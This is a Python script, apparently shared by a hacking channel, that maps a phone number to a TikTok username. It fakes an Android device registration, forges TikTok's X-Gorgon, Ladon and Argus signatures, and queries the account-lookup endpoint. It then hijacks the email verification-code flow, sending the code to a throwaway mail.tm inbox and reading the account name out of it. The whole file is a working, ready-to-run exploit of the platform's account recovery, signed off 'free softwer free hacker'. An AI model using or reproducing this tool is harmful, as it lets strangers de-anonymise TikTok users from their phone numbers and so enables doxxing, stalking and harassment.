import asyncio
import binascii
from hashlib import md5
import json
import os
import random
import secrets
import string
import time
from urllib.parse import urlencode
import uuid

import httpx
from user_agent import generate_user_agent

from hsopyt import Gorgon,Ladon,Argus,md5

class PhoneToUsernameTikTok():
    def __init__(self, phone: str, proxy: dict[str, str] | str | None = None) -> None:
        self.__httpx_proxy = proxy
        self.__phone = phone
        self.__client = self.__client_builder(self.__httpx_proxy)
        self.__xor_phone = self.__xor(self.__phone)
        self.__unix = str(round(int(time.time())))
        self.__device = None
        self.__param = None
    @staticmethod
    def __sign(params: str, payload: str or None = None, sec_device_id: str = "AadCFwpTyztA5j9L" + ''.join(secrets.choice(string.ascii_letters + string.digits) for _ in range(9)) , cookie: str or None = None, aid: int = 1233, license_id: int = 1611921764, sdk_version_str: str = 'v05.00.06-ov-android', sdk_version: int = 167775296, platform: int = 0, unix: float = None):
        x_ss_stub = md5(payload.encode('utf-8')).hexdigest() if payload != None else None
        if not unix: unix = time.time()

        return Gorgon(params, unix, payload, cookie).get_value() | {
            'content-length' : str(len(payload)),
            'x-ss-stub'      : x_ss_stub.upper(),
            'x-ladon'        : Ladon.encrypt(int(unix), license_id, aid),
            'x-argus'        : Argus.get_sign(params, x_ss_stub, int(unix),
                platform        = platform,
                aid             = aid,
                license_id      = license_id,
                sec_device_id   = sec_device_id,
                sdk_version     = sdk_version_str, 
                sdk_version_int = sdk_version
            )}
    async def __aenter__(self):
        return self

    async def __aexit__(self, exc_type, exc_val, exc_tb):
        await self.__client.aclose()

    @classmethod
    def __client_builder(cls, proxy: dict[str, str] | str | None = None) -> httpx.AsyncClient:
        if proxy:
            return httpx.AsyncClient(http2=True, follow_redirects=True, proxy=proxy)
        return httpx.AsyncClient(http2=True, follow_redirects=True)

    @staticmethod
    def __xor(string_val: str) -> str:
        return "".join([hex(ord(c) ^ 5)[2:] for c in string_val])

    @staticmethod
    def __extraxt_username(inbox: dict, token: str) -> str:
        try:
            return inbox["hydra:member"][0]["intro"].split("code Hi ")[1].split(",")[0]
        except Exception as e:
            return str(e)

    async def __get_device(self) -> dict[str, str] | None:
        url = (
            "https://log-boot.tiktokv.com/service/2/device_register/?req_id="
            + str(uuid.uuid4())
            + "&device_platform=android&os=android&ssmix=a&_rticket="
            + str(int(self.__unix) * 1000)
            + "&cdid="
            + str(uuid.uuid4())
            + "&channel=googleplay&aid=1233&app_name=musical_ly&version_code=450202"
            + "&version_name=45.2.2&manifest_version_code=2024502020"
            + "&update_version_code=2024502020&ab_version=45.2.2&resolution=1920*985"
            + "&dpi=180&device_type="
            + str(
                random.choice([
                    "SM-S948B", "SM-S946B", "SM-S941B", "SM-S938B",
                    "SM-S936B", "SM-S931B", "SM-S928B", "SM-S926B",
                    "SM-S921B", "SM-F956B", "SM-F741B", "SM-A556B",
                    "SM-A356B", "SM-A546B"
                ])
            )
            + "&device_brand="
            + str(random.choice(["samsung"]))
            + "&language=en&os_api=33&os_version=13&ac=mobile&is_pad=0"
            + "&app_type=normal&sys_region=US&last_install_time=1781032034"
            + "&timezone_name=GMT&app_language=en&timezone_offset=0&host_abi=arm64-v8a"
            + "&locale=en&ac2=unknown&uoo=1&op_region=US&build_number=45.2.2&region="
            + str(random.choice(["US", "IQ", "FR", "EG", "TR"]))
            + "&ts="
            + str(self.__unix)
            + "&openudid="
            + str(binascii.hexlify(os.urandom(8)).decode())
            + "&okhttp_version=4.2.243.51-tiktok&use_store_region_cookie=1"
        )
        params = url.split("?")[1]
        json_data = {
            "header": {
                "os": "Android",
                "os_version": "13",
                "os_api": 33,
                "device_model": params.split("device_type=")[1].split("&")[0],
                "device_brand": str(random.choice(["samsung"])),
                "device_manufacturer": str(random.choice(["samsung"])),
                "cpu_abi": "arm64-v8a",
                "density_dpi": 180,
                "display_density": "mdpi",
                "resolution": "985x1920",
                "display_density_v2": "hdpi",
                "resolution_v2": "1048x1920",
                "access": "mobile",
                "rom": "eng.aleast.20260403.132616",
                "rom_version": "lineage_waydroid_x86_64-userdebug 13 TQ3A.230901.001 eng.aleast.20260403.132616 test-keys",
                "language": random.choice(["en", "ar", "fr", "es"]),
                "timezone": 0,
                "tz_name": "GMT",
                "tz_offset": 0,
                "clientudid": str(uuid.uuid4()),
                "openudid": str(params).split("&openudid=")[1].split("&")[0],
                "channel": "googleplay",
                "not_request_sender": 1,
                "aid": 1233,
                "release_build": "e7f24b0_20260513",
                "ab_version": "45.2.2",
                "gaid_limited": 0,
                "custom": {
                    "ram_size": "16GB",
                    "dark_mode_setting_value": 1,
                    "is_flip": 0,
                    "is_foldable": 0,
                    "screen_height_dp": 1707,
                    "filter_warn": 0,
                    "priority_region": "US",
                    "user_period": 0,
                    "is_kids_mode": 0,
                    "web_ua": "Dalvik/2.1.0 (Linux; U; Android 13; "
                    + params.split("device_type=")[1].split("&")[0]
                    + " Build/TQ3A.230901.001)",
                    "screen_width_dp": 988,
                    "user_mode": -1,
                },
                "package": "com.zhiliaoapp.musically",
                "app_version": "45.2.2",
                "app_version_minor": "",
                "version_code": 450202,
                "update_version_code": 2024502020,
                "manifest_version_code": 2024502020,
                "app_name": "musical_ly",
                "tweaked_channel": "googleplay",
                "display_name": "TikTok",
                "sig_hash": uuid.uuid4().hex,
                "cdid": str(params).split("cdid=")[1].split("&")[0],
                "device_platform": "android",
                "git_hash": "5ae517f",
                "sdk_version_code": 205140390,
                "sdk_target_version": 30,
                "req_id": params.split("req_id=")[1].split("device_platform")[0],
                "sdk_version": "2.5.14.3",
                "guest_mode": 0,
                "sdk_flavor": "i18nInner",
                "apk_first_install_time": int(self.__unix) * 1000,
                "is_system_app": 0,
            },
            "magic_tag": "ss_app_log",
            "_gen_time": int(self.__unix) * 1000,
        }
        headers = {
            "Host": "log-boot.tiktokv.com",
            "X-Ss-Stub": str(md5(json.dumps(json_data).encode("UTF-8")).hexdigest().upper()),
            "X-Tt-App-Init-Region": "carrierregion=;mccmnc=;sysregion=US;appregion=US",
            "X-Tt-Request-Tag": "t=0;n=1",
            "X-Ss-Req-Ticket": str(int(self.__unix) * 1000),
            "X-Vc-Bdturing-Sdk-Version": "2.4.2.i18n",
            "User-Agent": "com.zhiliaoapp.musically/2024502020 (Linux; U; Android 13; en; "
            + params.split("device_type=")[1].split("&")[0]
            + "; Build/TQ3A.230901.001;tt-ok/3.12.13.21)",
            "Content-Type": "application/json; charset=utf-8",
            "Connection": "keep-alive",
        }
        response = await self.__client.post(url=url, headers=headers, json=json_data)
        try:
            if response.json().get("device_id") == 0:
                return await self.__get_device()
            else:
                return {
                    "did": str(response.json()["device_id"]),
                    "iid": str(response.json()["install_id"]),
                    "device_brand": "samsung",
                    "device_type": json_data["header"]["device_model"],
                    "cdid": json_data["header"]["cdid"],
                    "openudid": str(params).split("&openudid=")[1].split("&")[0],
                    "req_id": params.split("req_id=")[1].split("device_platform")[0],
                    "user_agent": headers.get("User-Agent")
                }
        except Exception:
            return await self.__get_device()

    async def __get_domins(self) -> str | None:
        try:
            response = await self.__client.get("https://api.mail.tm/domains")
            r = response.json()
            return r["hydra:member"][0]["domain"]
        except IndexError:
            return None

    def __get_param(self) -> dict:
        return {
            "request_tag_from": "h5",
            "fixed_mix_mode": "1",
            "mix_mode": "1",
            "account_param": self.__xor_phone,
            "scene": "1",
            "device_platform": "android",
            "os": "android",
            "ssmix": "a",
            "_rticket": str(round(int(time.time() * 1000))),
            "cdid": self.__device["cdid"],
            "channel": "googleplay",
            "aid": "1233",
            "app_name": "musical_ly",
            "version_code": "410103",
            'app_version':'41.1.3',
            "type": "3736",
            "version_name": "41.1.3",
            "manifest_version_code": "2024101030",
            "update_version_code": "2024101030",
            "ab_version": "41.1.3",
            "resolution": "1920*985",
            "dpi": "180",
            "device_type": self.__device["device_type"],
            "device_brand": self.__device["device_brand"],
            "language": "en",
            "os_api": "33",
            "os_version": "13",
            "ac": "mobile",
            "is_pad": "1",
            "app_type": "normal",
            "sys_region": "US",
            "last_install_time": "1788100062",
            "timezone_name": "GMT",
            "app_language": "en",
            "timezone_offset": "0",
            "host_abi": "arm64-v8a",
            "locale": "en",
            "ac2": "unknown",
            "uoo": "1",
            "op_region": "US",
            "build_number": "41.1.3",
            "region": "US",
            "ts": str(round(int(time.time()))),
            "iid": "7681732380773041927", # dont tachhhh لاتلعب بل iid و device_id لف رحمه على ديس رضعتو
            "device_id": "7681728114456315410", # dont tachhhhhhhhh
            "openudid": self.__device["openudid"],
            "support_webview": "1",
            "okhttp_version": "4.2.228.22-tiktok",
            "use_store_region_cookie": "1",
        }

    async def __get_token(self, email: str) -> str | None:
        headers = {
            "User-Agent": str(generate_user_agent()),
            "Accept": "application/json",
            "Accept-Language": "en-US,en;q=0.9",
            "Content-Type": "application/json",
            "Referer": "https://mail.tm/",
            "Origin": "https://mail.tm",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-site",
            "Connection": "keep-alive",
            "Priority": "u=4",
        }
        json_data = {
            "address": email,
            "password": "NtroAtro",
        }
        response = await self.__client.post("https://api.mail.tm/token", headers=headers, json=json_data)
        try:
            return response.json()["token"]
        except Exception:
            return None

    async def __get_email(self, domin: str) -> dict[str, str]:
        headers = {
            "User-Agent": str(generate_user_agent()),
            "Accept": "application/json",
            "Accept-Language": "en-US,en;q=0.9",
            "Content-Type": "application/json",
            "Referer": "https://mail.tm/",
            "Origin": "https://mail.tm",
            "Sec-Fetch-Dest": "empty",
            "Seccd-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-site",
            "Connection": "keep-alive",
            "Priority": "u=0",
        }
        json_data = {
            "address": "".join(random.choices(string.ascii_lowercase + string.digits, k=12)) + "@" + domin,
            "password": "NtroAtro",
        }
        response = await self.__client.post("https://api.mail.tm/accounts", headers=headers, json=json_data)
        try:
            return {"id": response.json()["id"], "email": response.json()["address"]}
        except Exception:
            return {"id": None, "email": None}

    async def __get_inbox(self, email: str, token: str, id: str) -> dict | str:
        try:
            headers = {
                "User-Agent": str(generate_user_agent()),
                "Accept": "*/*",
                "Accept-Language": "en-US,en;q=0.9",
                "Referer": "https://mail.tm/",
                "Origin": "https://mail.tm",
                "Sec-Fetch-Dest": "empty",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Site": "same-site",
                "authorization": "Bearer " + token,
                "Connection": "keep-alive",
                "If-None-Match": f"{id}",
                "Priority": "u=0",
            }
            response = await self.__client.get("https://api.mail.tm/messages", headers=headers)
            return response.json()
        except json.JSONDecodeError as e:
            return str(e)

    def __get_header(self, params: dict[str, str], host: str, data: str | dict[str, str] = "") -> dict:
        header = {
            "Host": host,
            "Accept": "application/json, text/plain, */*",
            "Tt-Ticket-Guard-Iteration-Version": "0",
            "Tt-Ticket-Guard-Version": "3",
            "Passport-Sdk-Settings": "x-tt-token",
            "Passport-Sdk-Sign": "x-tt-token",
            "Sdk-Version": "2",
            "X-Tt-Dm-Status": "login=0;ct=1;rt=6",
            "X-Tt-Dataflow-Id": "671088658",
            "Passport-Sdk-Version": "-1",
            "X-Tt-Bypass-Dp": "1",
            "X-Vc-Bdturing-Sdk-Version": "2.3.14.i18n",
            "Tt-Device-Guard-Iteration-Version": "1",
            #'User-Agent': 'com.zhiliaoapp.musically/2024101030 (Linux; U; Android 13; en_US; WayDroid x86_64 Device; Build/TQ3A.230901.001;tt-ok/3.12.13.21)',
            "User-Agent": "com.zhiliaoapp.musically/2024101030 (Linux; U; Android 13; en_US; "
            + self.__device["device_type"]
            + "; Build/TQ3A.230901.001;tt-ok/3.12.13.21)",
            "Content-Type": "application/x-www-form-urlencoded",
        }
        header.update(self.__sign(params=urlencode(params),aid=1233,payload=""))
        return header

    async def __ticket_request(self) -> httpx.Response | None:
        hosts = [
            "api16-normal-va.tiktokv.com",
            "api16-normal-c-alisg.tiktokv.com",
            "api16-normal-zr.tiktokv.com",
            "api31-normal-useast2a.tiktokv.com",
            "api16-normal-useast5.us.tiktokv.com",
            "api19-normal-useast8.us.tiktokv.com",
            "api31-normal-alisg.tiktokv.com",
            "api16-normal-c-tw.tiktokv.com",
            "api31-normal-zr.tiktokv.com",
            "api16-normal-no1a.tiktokv.eu",
            "api19-normal-ycru.tiktokv.com",
            "api16-normal.tiktokv.com",
            "api16-normal.ttapis.com",
            "api31-normal.tiktokv.com",
            "api22-normal.tiktokv.com",
            "api19-normal.tiktokv.com",
            "api-normal.tiktokv.com",
            "api21-normal.tiktokv.com",
            "api16-core.tiktokv.com",
            "api16-core-va.tiktokv.com",
            "api32-normal.tiktokv.com",
            "api33-normal.tiktokv.com",
        ]
        for host in hosts:
            try:
                response = await self.__client.post(
                    "https://" + host + "/passport/account_lookup/mobile/",
                    headers=self.__get_header(params=self.__param, host=host, data=""),
                    params=self.__param,
                )
                print(response.text)
                if response.json().get("data") is None:
                    return None
                return response
            except Exception as e:
                print(e)
                continue
        return None

    async def __send_code(self) -> str | None:
        try:
            domin = await self.__get_domins()
            tmMail = await self.__get_email(domin=domin)
        except Exception:
            return await self.__send_code()

        email = tmMail["email"]
        id = tmMail["id"]
        token = await self.__get_token(email=email)
        response_ticket = await self.__ticket_request()

        if response_ticket is None:
            return "Phone Not found in TikTok"

        try:
            ticket = response_ticket.json()["data"]["accounts"][0]["passport_ticket"]
        except Exception:
            return await self.__send_code()

        host = str(response_ticket.url).split("/passport/account_lookup/mobile/")[0].split("https://")[1]
        self.__param.update({"not_login_ticket": ticket, "email": self.__xor(email)})

        response = await self.__client.post(
            "https://" + host + "/passport/email/send_code/",
            headers=self.__get_header(params=self.__param, host=host, data=""),
            params=self.__param,
        )
        print(response.text)

        if "email_ticket" in response.text:
            await asyncio.sleep(5)
            inbox = await self.__get_inbox(email=email, token=token, id=id)
            username = self.__extraxt_username(inbox=inbox, token=token)
            return username
        else:
            return await self.__send_code()

    async def run(self) -> dict[str, str]:
        try:
            if self.__device is None:
                self.__device = await self.__get_device()
                self.__param = self.__get_param()

            username = await self.__send_code()
            if username == "Phone Not found in TikTok":
                return {
                    "status": "Failed",
                    "username": "",
                    "phone": self.__phone,
                    "message": "Phone Number Not found in TikTok",
                }
            return {"status": "success", "username": username, "phone": self.__phone}
        except Exception:
            return await self.run()


if __name__ == "__main__":
    proxy = input("Enter proxy (or press enter to skip. format : http://proxy) -> ")
    phone = input("Enter Phone Number With Country Key (+) -> ")
    print("Please wait, this may take a few seconds...")
    print(asyncio.run(PhoneToUsernameTikTok(phone=phone, proxy=proxy if proxy else None).run()))
#free softwer free hacker
#echo "by -> t.me/Saftey_1" > atro.txt